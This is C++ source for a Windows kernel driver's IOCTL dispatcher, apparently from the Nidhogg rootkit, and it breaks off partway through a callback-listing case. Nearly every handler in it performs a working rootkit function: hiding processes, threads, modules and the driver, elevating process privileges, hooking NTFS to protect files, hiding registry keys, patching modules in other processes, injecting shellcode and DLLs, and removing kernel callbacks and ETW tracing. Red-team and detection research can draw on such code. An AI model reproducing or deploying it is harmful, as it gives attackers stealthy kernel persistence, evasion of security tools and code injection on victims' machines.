#pragma once

// ** IOCTLS **********************************************************************************************
#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNHIDE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_THREAD CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_THREAD_PROTECTION CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_THREAD CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_MODULE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_LIST_PSROUTINES CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_HIDE_UNHIDE_DRIVER CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
// *******************************************************************************************************

/*
* Description:
* NidhoggDeviceControl is responsible for handling IOCTLs and returning output to the user via IRPs.
* Every user communication should go through this function using the relevant IOCTL.
*
* Parameters:
* @DeviceObject [PDEVICE_OBJECT] -- Not used.
* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
*
* Returns:
* @status		[NTSTATUS]		 -- Whether the function succeeded or not, if not the error code.
*/
NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;
	auto len = 0;

	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_NIDHOGG_PROTECT_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		FastMutex procMutex = NidhoggProccessUtils->GetProcessesLock();
		AutoLock locker(procMutex);

		if (NidhoggProccessUtils->GetProtectedProcessesCount() == MAX_PIDS) {
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}
		
		if (NidhoggProccessUtils->FindProcess(*data))
			break;

		if (!NidhoggProccessUtils->AddProcess(*data)) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		KdPrint((DRIVER_PREFIX "Protecting process with pid %d.\n", *data));
		len += sizeof(ULONG);

		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		FastMutex procMutex = NidhoggProccessUtils->GetProcessesLock();
		AutoLock locker(procMutex);

		if (NidhoggProccessUtils->GetProtectedProcessesCount() == 0) {
			status = STATUS_NOT_FOUND;
			break;
		}

		if (!NidhoggProccessUtils->RemoveProcess(*data)) {
			status = STATUS_NOT_FOUND;
			break;
		}


		KdPrint((DRIVER_PREFIX "Unprotecting process with pid %d.\n", *data));
		len += sizeof(ULONG);

		break;
	}

	case IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION:
	{
		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		NidhoggProccessUtils->ClearProtectedProcesses();
		break;
	}

	case IOCTL_NIDHOGG_HIDE_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data == 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!NT_SUCCESS(NidhoggProccessUtils->HideProcess(*data))) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		KdPrint((DRIVER_PREFIX "Hid process with pid %d.\n", *data));
		break;
	}

	case IOCTL_NIDHOGG_UNHIDE_PROCESS: 
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data == 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!NT_SUCCESS(NidhoggProccessUtils->UnhideProcess(*data))) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		KdPrint((DRIVER_PREFIX "Unhide process with pid %d.\n", *data));
		break;
	}

	case IOCTL_NIDHOGG_ELEVATE_PROCESS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data == 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggProccessUtils->ElevateProcess(*data);

		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "Elevated process with pid %d.\n", *data));

		break;
	}

	case IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ProcessSignature) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ProcessSignature*)Irp->AssociatedIrp.SystemBuffer;

		if ((data->Pid == 4) ||
			(data->SignatureSigner < PsProtectedSignerNone || data->SignatureSigner > PsProtectedSignerMax) ||
			(data->SignerType < PsProtectedTypeNone || data->SignerType > PsProtectedTypeProtected)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggProccessUtils->SetProcessSignature(data);

		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "New signature applied to %d.\n", data->Pid));

		break;
	}

	case IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES:
	{
		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ProtectedProcessesList) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ProtectedProcessesList*)Irp->AssociatedIrp.SystemBuffer;

		NidhoggProccessUtils->QueryProtectedProcesses(data);

		len += sizeof(ProtectedProcessesList);

		break;
	}

	case IOCTL_NIDHOGG_PROTECT_THREAD:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!Features.ThreadProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		FastMutex threadsMutex = NidhoggProccessUtils->GetThreadsLock();
		AutoLock locker(threadsMutex);

		if (NidhoggProccessUtils->GetProtectedThreadsCount() == MAX_TIDS) {
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (NidhoggProccessUtils->FindThread(*data))
			break;

		if (!NidhoggProccessUtils->AddThread(*data)) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		KdPrint((DRIVER_PREFIX "Protecting thread with tid %d.\n", *data));
		len += sizeof(ULONG);

		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_THREAD:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!Features.ThreadProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		FastMutex threadsMutex = NidhoggProccessUtils->GetThreadsLock();
		AutoLock locker(threadsMutex);

		if (NidhoggProccessUtils->GetProtectedThreadsCount()  == 0) {
			status = STATUS_NOT_FOUND;
			break;
		}

		if (!NidhoggProccessUtils->RemoveThread(*data)) {
			status = STATUS_NOT_FOUND;
			break;
		}


		KdPrint((DRIVER_PREFIX "Unprotecting thread with tid %d.\n", *data));
		len += sizeof(ULONG);

		break;
	}

	case IOCTL_NIDHOGG_HIDE_THREAD:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(ULONG) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;

		if (data == 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!NT_SUCCESS(NidhoggProccessUtils->HideThread(*data))) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		KdPrint((DRIVER_PREFIX "Hid thread with tid %d.\n", *data));
		break;
	}

	case IOCTL_NIDHOGG_CLEAR_THREAD_PROTECTION:
	{
		if (!Features.ThreadProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		NidhoggProccessUtils->ClearProtectedThreads();
		break;
	}

	case IOCTL_NIDHOGG_QUERY_PROTECTED_THREADS:
	{
		if (!Features.ThreadProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ThreadsList) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ThreadsList*)Irp->AssociatedIrp.SystemBuffer;
		NidhoggProccessUtils->QueryProtectedThreads(data);
		len += sizeof(ThreadsList);

		break;
	}

	case IOCTL_NIDHOGG_PROTECT_FILE:
	{
		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(WCHAR) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;

		if (!data) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		FastMutex filesMutex = NidhoggFileUtils->GetFileLock();
		AutoLock locker(filesMutex);

		if (NidhoggFileUtils->GetFilesCount() == MAX_FILES) {
			KdPrint((DRIVER_PREFIX "List is full.\n"));
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (!NidhoggFileUtils->FindFile(data)) {
			if (!NidhoggFileUtils->AddFile(data)) {
				KdPrint((DRIVER_PREFIX "Failed to add file.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			if (!NidhoggFileUtils->IsCallbackActivated(0)) {
				status = NidhoggFileUtils->InstallNtfsHook(IRP_MJ_CREATE);

				if (!NT_SUCCESS(status)) {
					NidhoggFileUtils->RemoveFile(data);
					KdPrint((DRIVER_PREFIX "Failed to hook ntfs.\n"));
					break;
				}
			}

			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Protecting file %ws.\n", data));
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_FILE:
	{
		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(WCHAR) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;

		if (!data) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		FastMutex filesMutex = NidhoggFileUtils->GetFileLock();
		AutoLock locker(filesMutex);

		if (!NidhoggFileUtils->RemoveFile(data)) {
			status = STATUS_NOT_FOUND;
			break;
		}

		if (NidhoggFileUtils->GetFilesCount() == 0) {
			status = NidhoggFileUtils->UninstallNtfsHook(IRP_MJ_CREATE);

			if (!NT_SUCCESS(status)) {
				KdPrint((DRIVER_PREFIX "Failed to restore the hook.\n"));
			}
		}

		auto prevIrql = KeGetCurrentIrql();
		KeLowerIrql(PASSIVE_LEVEL);
		KdPrint((DRIVER_PREFIX "Unprotected file %ws.\n", data));
		KeRaiseIrql(prevIrql, &prevIrql);
		break;
	}

	case IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION:
	{
		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		NidhoggFileUtils->ClearFilesList();
		break;
	}

	case IOCTL_NIDHOGG_QUERY_FILES:
	{
		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(FileItem) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (FileItem*)Irp->AssociatedIrp.SystemBuffer;
		status = NidhoggFileUtils->QueryFiles(data);

		len += sizeof(FileItem);

		break;
	}

	case IOCTL_NIDHOGG_PROTECT_REGITEM:
	{
		ULONG itemsCount = 0;

		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(RegItem) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;

		if ((data->Type != RegProtectedKey && data->Type != RegHiddenKey &&
			data->Type != RegProtectedValue && data->Type != RegHiddenValue) ||
			wcslen((*data).KeyPath) == 0) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
		AutoLock locker(regMutex);

		switch (data->Type) {
		case RegProtectedKey:
			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
			break;
		case RegHiddenKey:
			itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
			break;
		case RegProtectedValue:
			itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
			break;
		case RegHiddenValue:
			itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
			break;
		default:
			KdPrint((DRIVER_PREFIX "Unknown registry object type.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!NT_SUCCESS(status))
			break;
		
		if (itemsCount == MAX_REG_ITEMS) {
			KdPrint((DRIVER_PREFIX "List is full.\n"));
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (!NidhoggRegistryUtils->FindRegItem(data)) {
			if (!NidhoggRegistryUtils->AddRegItem(data)) {
				KdPrint((DRIVER_PREFIX "Failed to add new registry item.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			KdPrint((DRIVER_PREFIX "Added new registry item of type %d.\n", data->Type));
		}
		break;
	}

	case IOCTL_NIDHOGG_UNPROTECT_REGITEM:
	{
		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(RegItem) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;

		if ((data->Type != RegProtectedKey && data->Type != RegHiddenKey &&
			data->Type != RegProtectedValue && data->Type != RegHiddenValue) ||
			wcslen((*data).KeyPath) == 0) {
			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
		AutoLock locker(regMutex);

		if (!NidhoggRegistryUtils->RemoveRegItem(data)) {
			KdPrint((DRIVER_PREFIX "Registry item not found.\n"));
			status = STATUS_NOT_FOUND;
			break;
		}
		break;
	}

	case IOCTL_NIDHOGG_CLEAR_REGITEMS:
	{
		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
		AutoLock locker(regMutex);

		NidhoggRegistryUtils->ClearRegItems();

		break;
	}

	case IOCTL_NIDHOGG_QUERY_REGITEMS:
	{
		ULONG itemsCount = 0;

		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(RegItem) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;

		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
		AutoLock locker(regMutex);

		if ((data->Type != RegProtectedKey && data->Type != RegHiddenKey &&
			data->Type != RegProtectedValue && data->Type != RegHiddenValue)) {
			KdPrint((DRIVER_PREFIX "Invalid buffer.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (data->Type) {
		case RegProtectedKey:
			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
			break;
		case RegHiddenKey:
			itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
			break;
		case RegProtectedValue:
			itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
			break;
		case RegHiddenValue:
			itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
			break;
		}

		if (itemsCount == 0 || data->RegItemsIndex > itemsCount) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggRegistryUtils->QueryRegItem(data);
		len += sizeof(RegItem);

		break;
	}

	case IOCTL_NIDHOGG_PATCH_MODULE:
	{
		if (!Features.FunctionPatching) {
			KdPrint((DRIVER_PREFIX "Due to previous error, function patching feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(PatchedModule) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (PatchedModule*)Irp->AssociatedIrp.SystemBuffer;

		if (!data->FunctionName || !data->ModuleName || !data->Patch ||
			data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID || data->PatchLength <= 0) {
			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggMemoryUtils->PatchModule(data);

		if (NT_SUCCESS(status)) {
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Patched module %ws and function %s for process %d.\n", (*data).ModuleName, (*data).FunctionName, data->Pid));
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		len += sizeof(PatchedModule);
		break;
	}

	case IOCTL_NIDHOGG_HIDE_MODULE:
	{
		if (!Features.ModuleHiding) {
			KdPrint((DRIVER_PREFIX "Due to previous error, hiding module feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(HiddenModuleInformation) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (HiddenModuleInformation*)Irp->AssociatedIrp.SystemBuffer;

		if (!data->ModuleName || data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID) {
			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggMemoryUtils->HideModule(data);

		if (NT_SUCCESS(status)) {
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Hid module %ws for process %d.\n", (*data).ModuleName, data->Pid));
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		len += sizeof(HiddenModuleInformation);
		break;
	}

	case IOCTL_NIDHOGG_HIDE_UNHIDE_DRIVER:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(HiddenDriverInformation) != 0) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (HiddenDriverInformation*)Irp->AssociatedIrp.SystemBuffer;

		if (!data->DriverName) {
			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggMemoryUtils->HideDriver(data);

		if (NT_SUCCESS(status)) {
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Hid driver %ws.\n", (*data).DriverName));
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		len += sizeof(HiddenDriverInformation);
		break;
	}

	case IOCTL_NIDHOGG_INJECT_SHELLCODE: 
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(ShellcodeInformation) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ShellcodeInformation*)Irp->AssociatedIrp.SystemBuffer;

		if (data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID || !data->Shellcode || data->ShellcodeSize <= 0 || (data->Type != APCInjection && data->Type != NtCreateThreadExInjection)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (data->Type) {
		case APCInjection: {
			if (!Features.ApcInjection) {
				KdPrint((DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			status = NidhoggMemoryUtils->InjectShellcodeAPC(data);
			break;
		}
		case NtCreateThreadExInjection: {
			if (!Features.CreateThreadInjection) {
				KdPrint((DRIVER_PREFIX "Due to previous error, NtCreateThreadEx shellcode injection feature is unavaliable.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			status = NidhoggMemoryUtils->InjectShellcodeThread(data);
			break;
		}
		}

		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "Shellcode injected successfully.\n"));
		else
			KdPrint((DRIVER_PREFIX "Failed to inject shellcode (0x%08X)\n", status));

		len += sizeof(ShellcodeInformation);
		break;
	}

	case IOCTL_NIDHOGG_INJECT_DLL:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
		if (size % sizeof(DllInformation) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (DllInformation*)Irp->AssociatedIrp.SystemBuffer;

		if (data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID || !data->DllPath || (data->Type != APCInjection && data->Type != NtCreateThreadExInjection)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (data->Type) {
		case APCInjection: {
			if (!Features.ApcInjection) {
				KdPrint((DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			status = NidhoggMemoryUtils->InjectDllAPC(data);
			break;
		}
		case NtCreateThreadExInjection: {
			if (!Features.CreateThreadInjection) {
				KdPrint((DRIVER_PREFIX "Due to previous error, NtCreateThreadEx dll injection feature is unavaliable.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			status = NidhoggMemoryUtils->InjectDllThread(data);
			break;
		}
		}
		
		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "DLL injected successfully.\n"));
		else
			KdPrint((DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status));

		len += sizeof(DllInformation);
		break;
	}

	case IOCTL_NIDHOGG_LIST_OBCALLBACKS: 
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size % sizeof(ObCallbacksList) != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

